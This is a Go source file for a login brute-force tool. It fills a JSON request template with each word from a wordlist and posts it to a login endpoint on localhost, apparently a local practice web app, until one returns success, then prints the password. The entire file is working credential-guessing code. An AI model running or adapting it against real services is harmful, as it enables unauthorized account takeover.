package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"errors"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
)

func getRawRequest(filename string) (map[string]string, error) {
	var bodyParams map[string]string

	jsonFile, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer jsonFile.Close()

	fmt.Printf("Successfully opened %v\n", filename)

	bjson, err := ioutil.ReadAll(jsonFile)
	if err != nil {
		return nil, err
	}

	json.Unmarshal([]byte(bjson), &bodyParams)
	return bodyParams, nil
}

func findWordlistKey(rawreq map[string]string) (string, error) {
	var countConfig int = 0
	var foundKey string
	for key, value := range rawreq {
		if value == "WORDLIST" {
			countConfig++
			foundKey = key
		}
	}

	if countConfig >= 2 {
		return "", errors.New("Can't set WORDLIST in more than one key")
	} else {
		return foundKey, nil
	}
}

func createRequest(key string, word string, rawRequest map[string]string) *bytes.Buffer {
	rawRequest[key] = word
	jsonRequest, _ := json.Marshal(rawRequest)
	return bytes.NewBuffer(jsonRequest)
}

func main() {
	// Get the raw request from json file
	rawRequest, err := getRawRequest("rawrequest.json")
	if err != nil {
		fmt.Println(err)
		return
	}

	// Get the key set to performing the brute force
	wordlistKey, err := findWordlistKey(rawRequest)
	if err != nil {
		fmt.Println(err)
		return
	}

	// Read the wordlist, line by line
	wordlistFile, err := os.Open("wordlist.txt")
	if err != nil {
		fmt.Println(err)
		return
	}
	defer wordlistFile.Close()

	fmt.Println("Successfully opened wordlist")

	client := &http.Client{}
	scanner := bufio.NewScanner(wordlistFile)
	for scanner.Scan() {
		params := createRequest(wordlistKey, scanner.Text(), rawRequest)
		req, err := http.NewRequest("POST", "http://localhost:3000/rest/user/login",
			params)

		req.Header.Add("Content-Type", "application/json")
		res, err := client.Do(req)
		if err != nil {
			fmt.Println("err: ", err)
			return
		}
		if res.StatusCode == 200 {
			fmt.Printf("Successfully, password=> %v", scanner.Text())
			return
		}
		res.Body.Close()
	}
}
